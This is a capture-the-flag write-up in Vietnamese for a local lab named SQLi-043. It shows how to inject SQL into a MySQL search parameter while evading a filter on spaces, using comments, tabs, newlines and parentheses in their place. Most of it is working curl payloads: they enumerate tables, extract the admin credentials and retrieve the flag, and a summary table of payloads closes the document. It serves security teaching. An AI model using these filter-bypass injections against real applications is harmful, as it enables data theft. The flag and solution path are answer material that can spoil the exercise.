# SQLi-043: MySQL Space Filter Bypass - Writeup

## 📋 Tóm Tắt

**Kỹ thuật:** Space Filter Bypass bằng comments `/**/`, tab `%09`, newline `%0a`  
**DBMS:** MySQL  
**Flag:** `FLAG{sp4c3_byp4ss_c0mm3nt_1nj3ct10n}`

---

## 🔍 Bước 1: DETECT - Phát Hiện Lỗ Hổng

### 1.1. Phân tích ứng dụng

```bash
# Request bình thường
curl "http://localhost:5043/search?q=laptop"
# → Kết quả: Danh sách sản phẩm chứa "laptop"

# Thử injection với space
curl "http://localhost:5043/search?q=test' OR '1'='1"
# → Response: "Invalid characters detected! Space is not allowed."
```

### 1.2. Xác định filter

WAF đang chặn ký tự khoảng trắng (space) trong input. Cần tìm cách thay thế.

### 1.3. Test bypass với comments

```bash
# Thử bypass bằng /**/
curl "http://localhost:5043/search?q=test'/**/OR/**/'1'='1"
# → Kết quả: Tất cả sản phẩm hiển thị!
```

**SQLi confirmed với space bypass!**

---

## 🎯 Bước 2: IDENTIFY - Xác Định DBMS

### 2.1. MySQL-specific test

```bash
# Test comment syntax
curl "http://localhost:5043/search?q=test'%23"
# → Không lỗi → MySQL comment working

# Test version
curl "http://localhost:5043/search?q=test'/**/UNION/**/SELECT/**/1,@@version,3,4%23"
# → Hiển thị version: 8.0.x → MySQL confirmed!
```

---

## 🔢 Bước 3: ENUMERATE - Xác Định Số Cột

### 3.1. Đếm số cột với ORDER BY

```bash
# ORDER BY 4 - OK
curl "http://localhost:5043/search?q=test'/**/ORDER/**/BY/**/4%23"
# → Không lỗi

# ORDER BY 5 - Error
curl "http://localhost:5043/search?q=test'/**/ORDER/**/BY/**/5%23"
# → Error

# → Có 4 cột (id, name, description, price)
```

### 3.2. Xác định vị trí output

```bash
curl "http://localhost:5043/search?q=test'/**/UNION/**/SELECT/**/1,'col2','col3',4%23"
# → Hiển thị col2 và col3 trong kết quả
# → Cột 2 và 3 hiển thị ra giao diện
```

---

## 📊 Bước 4: EXTRACT - Liệt Kê Cấu Trúc

### 4.1. Liệt kê tên bảng

```bash
curl "http://localhost:5043/search?q=test'/**/UNION/**/SELECT/**/1,table_name,'x',4/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()%23"
```

**Kết quả:**

- products
- users
- flags ← **Target**

### 4.2. Liệt kê cột của bảng flags

```bash
curl "http://localhost:5043/search?q=test'/**/UNION/**/SELECT/**/1,column_name,'x',4/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='flags'%23"
```

**Kết quả:** id, name, value

### 4.3. Liệt kê cột của bảng users

```bash
curl "http://localhost:5043/search?q=test'/**/UNION/**/SELECT/**/1,column_name,'x',4/**/FROM/**/information_schema.columns/**/WHERE/**/table_name='users'%23"
```

**Kết quả:** id, username, password, email, role

---

## ⬆️ Bước 5: ESCALATE - Trích Xuất Dữ Liệu Nhạy Cảm

### 5.1. Extract admin credentials

```bash
curl "http://localhost:5043/search?q=test'/**/UNION/**/SELECT/**/1,username,password,4/**/FROM/**/users/**/WHERE/**/role='admin'%23"
```

**Kết quả:**
| Username | Password |
|----------|----------|
| admin | Sp4c3_Byp4ss_Adm1n! |

---

## 🏆 Bước 6: EXFILTRATE - Lấy Flag

### 6.1. Extract flag từ bảng flags

```bash
curl "http://localhost:5043/search?q=test'/**/UNION/**/SELECT/**/1,name,value,4/**/FROM/**/flags%23"
```

**Kết quả:**

🎉 **FLAG:** `FLAG{sp4c3_byp4ss_c0mm3nt_1nj3ct10n}`

---

## 🔧 Alternative Bypass Techniques

### Sử dụng Tab (%09)

```bash
curl "http://localhost:5043/search?q=test'%09UNION%09SELECT%091,2,3,4%23"
```

### Sử dụng Newline (%0a)

```bash
curl "http://localhost:5043/search?q=test'%0aUNION%0aSELECT%0a1,2,3,4%23"
```

### Sử dụng Carriage Return (%0d)

```bash
curl "http://localhost:5043/search?q=test'%0dUNION%0dSELECT%0d1,2,3,4%23"
```

### Sử dụng Parentheses

```bash
curl "http://localhost:5043/search?q=test')UNION(SELECT(1),(2),(3),(4))%23"
```

---

## 📝 Tổng Kết Payloads

| Giai đoạn     | Payload                                                                                                                      |
| ------------- | ---------------------------------------------------------------------------------------------------------------------------- |
| Test Bypass   | `test'/**/OR/**/'1'='1`                                                                                                      |
| Count Columns | `test'/**/ORDER/**/BY/**/4%23`                                                                                               |
| UNION Inject  | `test'/**/UNION/**/SELECT/**/1,2,3,4%23`                                                                                     |
| List Tables   | `test'/**/UNION/**/SELECT/**/1,table_name,'x',4/**/FROM/**/information_schema.tables/**/WHERE/**/table_schema=database()%23` |
| Get Flag      | `test'/**/UNION/**/SELECT/**/1,name,value,4/**/FROM/**/flags%23`                                                             |

---

## ✅ Flag

```
FLAG{sp4c3_byp4ss_c0mm3nt_1nj3ct10n}
```
